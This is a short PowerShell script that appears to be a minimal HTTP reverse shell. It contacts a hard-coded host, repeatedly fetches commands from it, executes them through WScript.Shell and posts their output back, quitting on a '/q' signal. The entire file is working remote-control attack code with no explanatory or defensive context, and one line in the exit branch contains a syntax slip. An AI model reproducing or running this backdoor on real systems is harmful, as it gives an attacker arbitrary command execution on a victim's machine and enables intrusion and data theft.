$s = New-Object -ComObject WScript.Shell
$u = "192.168.56.102"
$ProgressPreference = "SilentlyContinue"
$r = Invoke-WebRequest -Uri $u -Method POST -Body "+"
while ($TRUE){
    $r = Invoke-WebRequest -Uri $u -Method GET
    if($r.Content -eq "/q"){r = Invoke-WebRequest -Uri $u -Method POST -Body "~";exit}
    $e = $s.Exec("PowerShell -C " + $r.Content)
    $o = ($e.StdOut.ReadAll() | Out-String)
    $r = Invoke-WebRequest -Uri $u -Method POST -Body $o
}

